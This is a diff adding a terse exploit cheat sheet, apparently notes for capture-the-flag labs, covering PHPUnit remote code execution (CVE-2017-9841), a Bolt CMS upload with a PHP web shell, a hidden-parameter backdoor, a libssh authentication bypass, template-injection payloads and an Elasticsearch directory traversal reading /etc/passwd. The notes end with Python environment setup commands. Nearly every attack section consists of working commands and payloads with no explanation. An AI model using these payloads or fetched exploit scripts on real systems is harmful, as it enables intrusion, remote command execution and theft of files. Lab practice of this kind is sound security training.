@@ -1,0 +1,72 @@
+PHP Unit - Remote Code Execution (CVE-2017-9841)
+
+sudo apt install dirsearch
+dirsearch -u http://TARGET_IP:PORT/
+http://TARGET_IP:PORT/composer.json
+POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
+
+<?php system('cat /flag.txt'); ?>
+
+Bolt - File Upload Bypass / Logic Flaw
+
+http://TARGET_IP:PORT/bolt
+admin
+password
+
+<?php echo system($_GET['cmd']); ?>
+
+rce.html
+rce.php
+http://TARGET_IP:PORT/theme/base-2016/bolt.php?cmd=ls%20/
+http://TARGET_IP:PORT/theme/base-2016/bolt.php?cmd=cat%20/flag.txt
+
+Nondiff-backdoor - Source Code Leak & Hidden Backdoor
+
+dirsearch -u http://TARGET_IP:PORT/ -t 50
+wget http://TARGET_IP:PORT/backup.zip
+unzip backup.zip
+grep -r "shell_exec(" -n .
+http://TARGET_IP:PORT/?welldone=knockknock&shazam=cat%20flag.php
+http://TARGET_IP:PORT/?welldone=knockknock&shazam=grep%20-r%20CTF
+
+Libssh - Authentication Bypass (CVE-2018-10993)
+
+nmap -sV -sC -p 31276 TARGET_IP -Pn
+curl -sL https://gist.githubusercontent.com/mgeeky/a7271536b1d815acfb8060fd8b65bd5d/raw -o libssh.py
+python3 libssh.py TARGET_IP -p 31276 -c "cd ..;cat flag.txt"
+
+Shark - Server-Side Template Injection (SSTI)
+
+${7*7}
+${import('os').popen('cat flag').read()}
+
+Elastic - Directory Traversal (CVE-2015-5531)
+
+sudo apt update
+sudo apt install exploitdb
+sudo apt install libxml2-utils
+searchsploit elasticsearch
+curl -sL https://raw.githubusercontent.com/nixawk/labs/master/CVE-2015-5531/exploit.py -o exploit_elastic.py
+python3 -m pip install requests
+python3 exploit_elastic.py http://TARGET_IP:PORT /etc/passwd
+
+Linux Python/Env Maintenance
+
+sudo apt update
+sudo apt install python3 python3-pip python3-venv -y
+which python3
+which pip3
+sudo apt install python3-venv -y
+python3 -m venv venv
+source venv/bin/activate
+python3 -m ensurepip --upgrade
+wget https://bootstrap.pypa.io/get-pip.py
+python3 get-pip.py
+python3 -m pip --version
+pip install <package_name>
+sudo apt install python3-<package_name>
+pip install <package_name> --break-system-packages
+python3 --version
+pip3 -V
+pip3 list
+deactivate
